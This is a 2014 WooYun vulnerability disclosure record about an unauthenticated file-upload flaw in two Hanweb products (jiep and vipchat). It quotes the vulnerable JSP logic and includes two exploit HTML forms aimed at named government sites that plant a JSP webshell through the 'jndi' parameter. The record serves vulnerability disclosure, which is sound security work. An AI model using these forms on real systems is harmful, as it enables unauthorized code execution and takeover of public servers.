{"id": 3895, "wybug_id": "wooyun-2014-052617", "wybug_title": "某个可能可以影响大汉jiep和vipchat的越权+getshell漏洞", "wybug_corp": "南京大汉网络有限公司", "wybug_author": "wefgod", "wybug_date": "2014-03-03 11:32", "wybug_open_date": "2014-06-01 11:32", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件上传", "文件上传安全", "文件上传"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-03-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-03-03：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-03-06：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-04-27：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-05-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-05-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-06-01：\t细节向公众公开  简要描述： 两套系统通用。JIS的真木有发现其它漏洞了，而且之前的漏洞修复的非常快了 详细说明：  vipchat应该是叫在线访谈系统jiep叫信息交换平台两套系统存在一个相同的越权+getshell漏洞   漏洞证明：  出现问题的都是setup/opr_setting.jsp先看jiep的这个文件的部分源码：\n//上传操作\tboolean b = upload.uploadFile(request);\tString jndi = upload.getFormValue(\"jndi\");////jndi参数可控\t//上传成功\tif (b) {\t\tString[] files = upload.getAllFileName();\t\t//打印文件名称\t\tfor (int i = 0; i < files.length; i++) {\t\t\tString filename = files[i];\t\t\t//上传文件名称！=注册文件名时，进行改名操作\t\t\tif (!filename.equals(jndi + \".licence\")) {\t\t\t\t//删除原文件\t\t\t\tFile licencefile = new File(strDictionary + jndi\t\t\t\t\t\t+ \".licence\");\t\t\t\tif (licencefile.exists())\t\t\t\t\tlicencefile.delete();\t\t\t\tFile file = new File(strDictionary + filename);\t\t\t\tfile.renameTo(new File(strDictionary + jndi\t\t\t\t\t\t+ \".licence\")); //jndi参数可控\t\t\t} \t\t}\t}\n前面是没有相关的登录验证的，jndi参数可控导致了getshell的可能（就算加了登录验证，这里不处理也是没用的，登录验证不是万能的，只是一个最简单的手段，看之前的源码修复情况还是希望厂商略微注意）来个Exp\n<html><form action=\"http://www.gansu.gov.cn/jiep/setup/opr_setting.jsp\" name=\"test\" method=\"post\" enctype=\"multipart/form-data\"><input type=\"file\" name=\"file\" size=\"23\" id=\"file\" /><input type=\"hidden\" name=\"jndi\" value=\"jsp.jsp \" /><input type=\"submit\" value=\"Submit\" /></form></html>\n提交看下图：\n\n会提示500，忽视之。\n\n直接连：\n\n再看vipchat的源码：\n//上传成功\tif(b){\t\tString[] files = upload.getAllFileName();\t\t\t\t//打印文件名称\t\tfor (int i=0;i<files.length;i++){\t\t\tString filename = files[i];\t\t\t\t\t\t//上传文件名称！=注册文件名时，进行改名操作\t\t\tif(!filename.equals( jndi + \".licence\")){\t\t\t\t//删除原文件\t\t\t\tFile licencefile = new File(strDictionary+ jndi + \".licence\");\t\t\t\tif(licencefile.exists())\t\t\t\t\tlicencefile.delete();\t\t\t\tFile file = new File(strDictionary + filename);\t\t\t\tfile.renameTo(new File(strDictionary+ jndi + \".licence\"));\t\t\t}\t\t}\t}\n漏洞成因和上面说的一样，jndi参数来Exp\n<html><form action=\"http://www.liaocheng.gov.cn/vipchat/setup/opr_setting.jsp\" name=\"test\" method=\"post\" enctype=\"multipart/form-data\"><input type=\"file\" name=\"file\" size=\"23\" id=\"file\" /><input type=\"hidden\" name=\"jndi\" value=\"jsp.jsp \" /><input type=\"submit\" value=\"Submit\" /></form></html>\n看图\n\n连之：\n\n   修复方案：  厂商给rank太少了……   版权声明：转载请注明来源 wefgod@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：13  确认时间：2014-03-03 16:55 厂商回复： 非常感谢您对大汉产品的关注以及对产品安全方面的指正，涉及问题已在新版本中修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-03-03 12:18 |    \t\t刺刺 \t\t\t( 普通白帽子  |\t\t\t        Rank:603 漏洞数:52        | 真正的安全并不是技术，而是人类善良的心灵...)\t\t \n  他们的东西几乎都是在一个框架下搞出来的。setup目录必不可少，原本以为前几日他们不让你搞了，等过几天我来提交呢。    \n     2014-03-03 12:27 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @刺刺 类似的漏洞其实他们应该知道了的。    \n     2014-03-03 12:46 |    \t\tCoody  \t\t\t( 核心白帽子 |\t\t\t        Rank:1565 漏洞数:189        | 不接单、不黑产；如遇接单收徒、绝非本人所...)\t\t \n  我是来看楼主的    \n     2014-03-03 12:49 |    \t\tHackBraid  \t\t\t( 核心白帽子 |\t\t\t        Rank:1545 漏洞数:260        | ...........................................)\t\t \n  厉害！    \n     2014-03-03 14:28 |    \t\tpandas \t\t\t( 普通白帽子  |\t\t\t        Rank:585 漏洞数:58        | 国家一级保护动物)\t\t \n  厂商不是不让你提了吗,难道上次封口费给少了？ ^_^    \n     2014-03-03 16:00 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @pandas 没有。他们说欢迎提交啊。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 13, "Ranks": null}